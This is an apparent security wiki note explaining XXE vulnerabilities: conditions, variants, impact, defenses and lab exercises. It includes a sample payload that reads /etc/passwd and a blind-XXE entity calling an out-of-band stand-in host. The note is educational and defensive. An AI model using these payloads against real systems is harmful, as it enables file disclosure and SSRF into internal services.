---
migration_source: published-html-snapshot
migration_status: needs-editorial-review
---

# XXE

## Definition

XML External Entity (XXE) vulnerabilities occur when an XML parser resolves attacker-controlled external entities, allowing XML input to trigger file reads, SSRF, or denial of service.

## Why it matters

XXE is a parser configuration flaw. A feature may appear to accept ordinary XML, but the parser may fetch local files or network resources while expanding entities. This connects input parsing to filesystem and internal-network access.

## How it works

XXE has **4 conditions**:

1. **XML input reaches a parser.**
2. **DTD/entity processing is enabled.**
3. **The attacker can define an external entity.**
4. **The application returns, uses, or leaks the expanded entity or side effect.**

Payload-shaped example:

```
<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root>&xxe;</root>
```

The bug is not XML itself. The bug is letting untrusted XML control entity resolution.

## Techniques / patterns

Attackers test:

- XML request bodies and file uploads
- SOAP, SAML, SVG, DOCX/XLSX, XML-based import/export
- direct file-read payloads
- SSRF payloads to metadata or internal services
- blind XXE with out-of-band DNS/HTTP callbacks
- parameter entities and parser-specific behavior

## Variants and bypasses

XXE appears in **5 forms**.

### 1. In-band file disclosure

The expanded entity appears in the response.

### 2. Blind XXE

The response hides output, but DNS/HTTP callbacks prove resolution.

### 3. SSRF via entity resolution

The parser fetches internal URLs or metadata endpoints.

### 4. XML upload XXE

Uploaded SVG, office files, or XML imports trigger parsing server-side.

### 5. Entity expansion denial of service

Recursive or large entities consume parser resources.

## Impact

Ordered roughly by severity:

- **Local file disclosure.** Sensitive files or configuration leak.
- **SSRF and internal reachability.** XML parsing reaches internal services.
- **Credential theft.** Cloud metadata or local secrets are exposed.
- **Denial of service.** Entity expansion consumes CPU or memory.
- **Recon.** Parser errors reveal filesystem paths and XML libraries.

## Detection and defense

Ordered by effectiveness:

1.
**Disable DTDs and external entity resolution for untrusted XML.**
   This removes the dangerous parser capability.

2.
**Use hardened parser configurations and safe libraries.**
   Defaults vary by language and version; configure parsers explicitly.

3.
**Avoid XML where a simpler format is sufficient.**
   JSON or strict schema-based formats reduce entity-resolution risk.

4.
**Validate XML schema before business logic.**
   Schema validation helps shape input but must not require unsafe entity processing.

5.
**Restrict network and filesystem access from parsing workloads.**
   Isolation reduces blast radius if a parser is misconfigured.

### What does not work as a primary defense

- **Input filtering for `<!DOCTYPE`.** Encodings and parser features can bypass naive filters.
- **Assuming no response means safe.** Blind XXE can use callbacks.
- **Relying only on schema validation.** DTD/entity handling may happen before useful validation.
- **Blocking one metadata IP string.** SSRF-style bypasses still apply.

## Practical labs

Use local labs or intentionally vulnerable targets.

### Locate XML parsers

```
rg -n "DocumentBuilder|SAXParser|XMLInputFactory|lxml|etree|XmlReader|simplexml|DOMDocument" src
```

Review parser options for DTD and external entity behavior.

### Test safe file-read behavior

```
curl -i -H 'Content-Type: application/xml' --data-binary @payload.xml https://app.example.test/import
```

Only use harmless lab files in controlled environments.

### Test blind callback in a lab

```
<!DOCTYPE x [ <!ENTITY % ext SYSTEM "http://collab.example.test/xxe"> %ext; ]>
```

Out-of-band callbacks prove external resolution.

## Practical examples

- A SOAP endpoint parses attacker-controlled XML.
- An SVG upload triggers XML parsing and file reads.
- A SAML integration accepts unsafe XML parser defaults.
- An import feature fetches internal URLs through XXE.
- An office document parser expands XML entities.

## Related notes

- [[ssrf]]
- [[file-upload-abuse]]
- [[deserialization]]
- [[path-traversal]]
- [[metadata-endpoints|Metadata Endpoints]]

### Suggested future atomic notes

- blind-xxe
- xml-parser-hardening
- svg-xxe
- saml-xml-security
- entity-expansion-dos

## References

- **Foundational:** OWASP XML External Entity Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- **Testing / Lab:** PortSwigger XXE — https://portswigger.net/web-security/xxe
- **Foundational:** OWASP WSTG latest — https://owasp.org/www-project-web-security-testing-guide/latest/
